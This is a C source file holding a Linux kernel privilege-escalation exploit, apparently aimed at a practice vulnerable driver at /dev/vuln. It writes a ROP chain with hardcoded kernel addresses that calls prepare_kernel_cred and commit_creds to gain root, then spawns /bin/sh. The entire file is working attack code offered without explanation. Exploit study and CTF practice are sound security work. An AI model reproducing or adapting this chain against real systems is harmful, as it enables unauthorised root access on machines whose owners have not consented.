#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define _GNU_SOURCE

uint64_t prepare_kernel_cred = 0xffffffff810918e0ULL;
uint64_t commit_creds = 0xffffffff81091630ULL;
uint64_t pop_rdi = 0xffffffff81300f2dULL; // pop rdi; ret;
uint64_t pop_rsp = 0xffffffff81029210ULL; // pop rsp ; ret

int opend_;
void open_device_state() {
  opend_ = open("/dev/vuln", O_RDWR);
  if (opend_ < 0) {
    printf("[-] unable to open device\n");
  } else {
    printf("[+] device opened\n");
  }
}

void smash() {
  uint64_t fake_stack[10];
  fake_stack[0] = 0x4141414141414141ULL;
  fake_stack[1] = 0x4241414141414141ULL;
  fake_stack[2] = 0x4341414141414141ULL;
  fake_stack[3] = 0x4441414141414141ULL;
  fake_stack[4] = pop_rdi;
  fake_stack[5] = 0x0;
  fake_stack[6] = prepare_kernel_cred;
  fake_stack[7] = commit_creds;
  fake_stack[8] = pop_rsp;
  fake_stack[9] = 0xffffc900001bff08ULL; /* old RSP */
  write(opend_, fake_stack, sizeof(fake_stack));
}

int main() {
  open_device_state();
  smash();
  setreuid(0, 0);
  if (getuid() == 0) {
    printf("[+] the flow is defeated!\n");
    char *argvsh[] = {"/bin/sh", NULL};
    execve("/bin/sh", argvsh, 0);
  } else {
    printf("[?] something went wrong\n");
  }
}
